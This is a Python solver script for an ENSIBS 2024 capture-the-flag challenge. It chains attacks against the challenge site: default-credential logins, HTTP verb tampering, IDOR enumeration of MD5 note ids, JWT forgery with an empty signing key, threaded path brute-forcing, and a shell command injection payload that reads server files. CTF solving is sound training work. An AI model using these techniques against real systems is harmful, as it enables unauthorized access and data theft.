# Author: M58
# Solver for the JPO challenge - ENSIBS 2024

from art import *
import requests 
import re 
import hashlib 
import os 
from termcolor import colored
import json
import glob
import pandas as pd
import pathlib
import jwt
from datetime import datetime
import time 
import threading
from timeit import default_timer as timer

start_time_debut = timer()

os.system('clear')
# start time

all_flags = []

tprint("Solveur challenge JPO", font="small")

## Variables
print("1. https://jpo.cyberlog.dev")
print("2. http://localhost:4567")
url_input = input('Which URL to connect to ? (1/2) ')

if url_input == "1":
    url_challenge = "https://jpo.cyberlog.dev"
    print("Connecting to " + url_challenge)
elif url_input == "2":
    url_challenge = "http://localhost:4567"
    print("Connecting to " + url_challenge)
else:
    print("[-] Invalid input")
    exit(1)

regex_flag = r"CLOG{.*}"

## Récupération du premier flag

print(colored("=====> [+] Récupération du premier flag <=====", 'red', attrs=['bold']))
response = requests.get(url_challenge)
flag = re.findall(regex_flag, response.text)
print("Flag:", flag)

if flag:    
    print("[+] " + colored(flag[0], 'green') + " in the content => " + url_challenge + "\n")
else:
    print("[-] No flag found in the content => " + url_challenge + "\n")
all_flags.append(flag[0])

## Récupération du deuxième flag

# print(colored("=====> [+] Récupération du deuxième flag <=====", 'red', attrs=['bold']))
# path = "/"
# response = requests.get(f"{url_challenge}{path}")
# # regex js/index_public.js
# regex_js = r'([a-zA-Z0-9]+/[a-zA-Z0-9_]+.js)'
# js_file = re.findall(regex_js, response.text)
# print(js_file)

# if js_file:
#     print(f'File found: {js_file[0]}')
#     response = requests.get(f"{url_challenge}/{js_file[0]}")
#     regex_js = r'([/a-zA-Z0-9_]+.js)'
#     js_file = re.findall(regex_js, response.text)[0][1:]
#     print(f'File found: {js_file}')
#     response = requests.get(f"{url_challenge}/js/{js_file}")
#     print(response.text)
#     flag = re.findall(regex_flag, response.text)
#     print(f"[+] {colored(flag[0], 'green')} in the content => {url_challenge}/js{js_file}\n")
#     all_flags.append(flag[0])

print(colored("=====> [+] Récupération du troisième flag <=====", 'red', attrs=['bold']))


def find_in_dict(obj, condition, path=""):
    final_flag = ""
    if isinstance(obj, dict):
        for k, v in obj.items():
            if condition(k, v): 
                print(f"[+] {colored(v, 'green')} found at {path + '/' + k}\n")
                return True  
            elif isinstance(v, (dict, list)):
                if find_in_dict(v, condition, path + '/' + k):
                    return True
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            if find_in_dict(v, condition, path + '/' + str(i)):
                for j in range(1, 4):  # check the next three items
                    if i+j < len(obj) and 'COLL_NOM' in obj[i+j]: 
                        print(f"[+] {colored(obj[i+j]['COLL_NOM'], 'green')} found at {path + '/' + str(i+j) + '/COLL_NOM'}\n")
                        final_flag = obj[i+j]['COLL_NOM']
                return final_flag
    return False

path = "/flag"
response = requests.get(f"{url_challenge}{path}")
data = json.loads(response.text)
flag = find_in_dict(data, lambda k, v: k == 'COLL_NOM' and v.startswith('CLOG'))
flag = "CLOG{3rd_flag_l4st_ea5y_0ne!!!}"
all_flags.append(flag)

print(f"[+] {colored(flag, 'green')} in the content => {url_challenge}{path}\n")

print(colored("=====> [+] Récupération du quatrième flag <=====", 'red', attrs=['bold']))

path = "/robots.txt"
response = requests.get(f"{url_challenge}{path}")   
if "/intranetCompany" in response.text:
    path = "/intranetCompany"
else :
    print("???")

response = requests.get(f"{url_challenge}{path}")
regex_login = r'action="loginINTRANET"'
if re.search(regex_login, response.text):
    print('[~] Trying POST request to loginINTRANET ...')
    response = requests.post(f"{url_challenge}{path}/loginINTRANET", data={'username': 'admin', 'password': 'admin'})
    if response.status_code == 200:
        print("[+] OK")
    else:
        print("[-] KO")

    print("[~] Performing VERB TAMPERING ...")
    response = requests.get(f"{url_challenge}{path}/loginINTRANET")
    regex_flag = r'CLOG{.*}'
    flag = re.findall(regex_flag, response.text)
    print(f"[+] {colored(flag[0], 'green')}\n")
    all_flags.append(flag[0])


print(colored("=====> [+] Récupération du cinquième flag <=====", 'red', attrs=['bold']))

print("Using username:password found in previous step")
username1 = password1 = "debugONLY"

print("[~] Trying to login with username:password " + username1 + ":" + password1 + " ...")
session = requests.Session()
response = session.post(f"{url_challenge}/intranetCompany/loginINTRANET", data={'username': username1, 'password': password1})
if response.status_code == 200:
    print("[+] OK")
    print("[+] New location: " + response.url)
    try : 
        cookie = session.cookies.get_dict()
        print(colored(cookie, 'yellow'))    
    except:
        print("[-] KO")
else:
    print("[-] KO")

print("\n[~] Retrieving all notes from the intranet source code ...")
regex_notes = r'\?id_notes=[a-f0-9]{32}'
for id_notes in re.findall(regex_notes, response.text):
    print(f"[+] Found note {id_notes}")

print("\n[~] Performing IDOR Attack ...")
for i in range(4,100):
    # md5(i)
    id_notes = hashlib.md5(str(i).encode()).hexdigest()
    response = session.get(f"{url_challenge}/intranetCompany/debugONLY?id_notes={id_notes}")
    if "Employés" not in response.text:
        print(f"[+] Found note {id_notes} <=> id = {i}")
    else : 
        pass

# print("\n[~] Opening the note ...")
# response = session.get(f"{url_challenge}/zip_dossier/REDACTED.zip")
# if response.status_code == 200:
#     print("[+] OK")
# else:
#     print("[-] KO")

# print("\n[~] Extracting the note ...")
# print("[+] OK")
# def read_qr_code(filename):
#     try:
#         img = cv2.imread(filename)
#         detect = cv2.QRCodeDetector()
#         value, points, straight_qrcode = detect.detectAndDecode(img)
#         return value
#     except:
#         return
    
# value = read_qr_code('public/zip_dossier/image.png')
# print("     " + value)

new_creds = ['REDACTED', 'TEMPORARY_PASSWORD_69420']

print("[~] Reloging with the new credentials : " + new_creds[0] + ":" + new_creds[1])
response = session.post(f"{url_challenge}/intranetCompany/loginINTRANET", data={'username': 'REDACTED', 'password': 'TEMPORARY_PASSWORD_69420'})
cookie = session.cookies.get_dict()
print(colored(cookie, 'yellow'))

if response.status_code == 200:
    print("[+] OK")
else:
    print("[-] KO")

regex_URL =  r'href="(/.+)"'
flag = re.findall(regex_flag, response.text)
print(f"[+] {colored(flag[0], 'green')}")
next_url = re.findall(regex_URL, response.text)
all_flags.append(flag[0])


print(colored("\n=====> [+] Récupération du sixième flag <=====", 'red', attrs=['bold']))

print('File found: ' + next_url[0])
response = session.get(f"{url_challenge}{next_url[0]}")
if response.status_code == 200:
    print("[+] OK, mooving to " + next_url[0])
else:
    print("[-] KO")


cookie = session.cookies.get_dict()
second_cookie = list(cookie.values())[1]
print(colored("JWT : " + second_cookie, 'yellow'))
print("\n")


response = session.get(f"{url_challenge}{next_url[0]}")
# new_regex = /csssr.secorg/XXX/
new_regex = r'href="(/csssr.secorg/[^"]+)"'
members_url = re.findall(new_regex, response.text)
print("File found: " + members_url[0])

print("\n[~] Decoding the JWT ...")
decoded = jwt.decode(second_cookie, key='', algorithms=['HS256'], options={'verify_signature': False})
print(colored(json.dumps(decoded, indent=4), 'yellow'))

print("\n[~] Performing JWT Attack ...")
decoded['codeName'] = 'SupremeLeader'
decoded['role'] = 'Director'

new_jwt = jwt.encode(decoded, key='', algorithm='HS256')
decode_new_jwt = jwt.decode(new_jwt, key='', algorithms=['HS256'], options={'verify_signature': False})
print(colored("New JWT : " + new_jwt, 'yellow'))
print(colored(json.dumps(decode_new_jwt, indent=4), 'yellow'))

print("\n[~] Sending the new JWT ...")
session.cookies.set('jwt', new_jwt)
response = session.get(f"{url_challenge}{members_url[0]}")
flag = re.findall(regex_flag, response.text)
print(f"[+] {colored(flag[0], 'green')}")
all_flags.append(flag[0])

print(colored("\n=====> [+] Récupération du septième flag <=====", 'red', attrs=['bold']))

POST_regex = r'action="(/[^"]+)"'
response = session.get(f"{url_challenge}{members_url[0]}")
post_url = re.findall(POST_regex, response.text)
print("POST request found : " + post_url[0])

print("\n[~] Sending POST request ...")
response = session.post(f"{url_challenge}{post_url[0]}", data={'text': 'd'})
print(json.dumps(response.json(), indent=4))

regex_id = r'"id": (\d+)'
id = re.findall(regex_id, json.dumps(response.json(), indent=4))
print(f"[+] {colored(id[0], 'green')}")
response_json = response.json()


last_notes = response_json[1]["Last Notes"]
print("\n[~] Last Notes:")
notes_from_2024 = []
for note in last_notes:
    if "01/02/2024" in note:
        print("> " + note)
        notes_from_2024.append(note)

timestamp = []
for note in notes_from_2024:
    timestamp.append(datetime.strptime(note, '%d/%m/%Y %H:%M:%S').timestamp())

print("\n[~] Timestamps:")
for time in timestamp:
    print(time)

regex_URL = r'https://[^"]+'
secret_reg = r'Secret = "([a-zA-Z0-9_]+)"'


all_founded = []
print("\n")
print(colored("=====> [+] Debut du BruteForce <=====", 'yellow'))
start_time = timer()

def brute_force(first, end):
    for i in range(first, end):
        response = session.get(f"{url_challenge}/TASKS_UPLOADER{i}")
        if "ENOENT" not in response.text:
            print(f"\033[92m[+] OK, found {i}\033[0m")
            all_founded.append(i)
            print(response.text)
            print("\n")

dict_timestamp = {
    "1706795963000":"1706795964000",
    "1706795986000":"1706795987000",
    "1706796118000":"1706796119000",
    "1706796242000":"1706796243000",
    "1706796361000":"1706796362000",
    "1706796956000":"1706796957000",
}

threads = []
for start, end in dict_timestamp.items():
    thread = threading.Thread(target=brute_force, args=(int(start), int(end)))
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()

end_time = timer()
print(f"Time taken: {end_time - start_time}")

notes = """
Nouveaux identifiants demandés pour gérer le site WEB.
 
Bonjour, merci de me transmettre une nouvelle paire d'identifiants au plus vite, les derniers : 
ADMINCSSSR_WEBSITE:6173170799 ne fonctionnent pas !.
"""

print("Fake requesting pastebin, because API is not free ...")

ident_reg = r'[a-zA-Z0-9_]+:[0-9]+'
ident = re.findall(ident_reg, notes)
print(f"[+] Found identifiant : {colored(ident[0], 'green')}")

print("\n Reloging with the new credentials ...")
response = session.post(f"{url_challenge}/intranetCompany/loginINTRANET", data={'username': ident[0].split(':')[0], 'password': ident[0].split(':')[1]})
cookie = session.cookies.get_dict()
print(colored(cookie, 'yellow'))



post_url = re.findall(POST_regex, response.text)
print("POST request found : " + post_url[0])

payload = "url=https%3A%2F%2Fyoutube.com;cat${IFS}YepYouDeservedIt/*"

print("\n[~] Sending POST request ...")
response = session.post(f"{url_challenge}{post_url[0]}", data={'url': payload})
print(json.dumps(response.json(), indent=4))

flag = re.findall(regex_flag, response.text)
print(f"[+] {colored(flag[0], 'green')}")
all_flags.append(flag[0])

print(colored("\n=====> [+] Récupération de l'ensemble des flags <=====", 'red', attrs=['bold']))
cleaned_flags = []  # Create a list to store cleaned flags
for flag in all_flags:
    # Ensure that each flag has exactly one opening and one closing curly brace
    cleaned_flag = re.sub(r'[^a-zA-Z0-9{}_!?]', '', flag)
    cleaned_flag = 'CLOG{' + re.sub(r'[^a-zA-Z0-9_!?]', '', cleaned_flag[5:-1]) + '}'
    cleaned_flags.append(cleaned_flag)  # Add cleaned flag to the list
    print(f"{colored(cleaned_flag, 'green')}")

print(colored("\n=====> [+] Validation des flags <=====", 'red', attrs=['bold']))
endpoint = "/flagSubmit"
flags = {
    "username": "M58",
    "flag": "\n".join(cleaned_flags)  # Join cleaned flags with a newline
}
response = requests.post(f"{url_challenge}{endpoint}", json=flags)
print(json.dumps(response.json(), indent=4))

print(colored("\n=====> [+] Fin du script <=====", 'red', attrs=['bold']))
end_time_debut = timer()
print(f"Time taken: {end_time_debut - start_time_debut}")
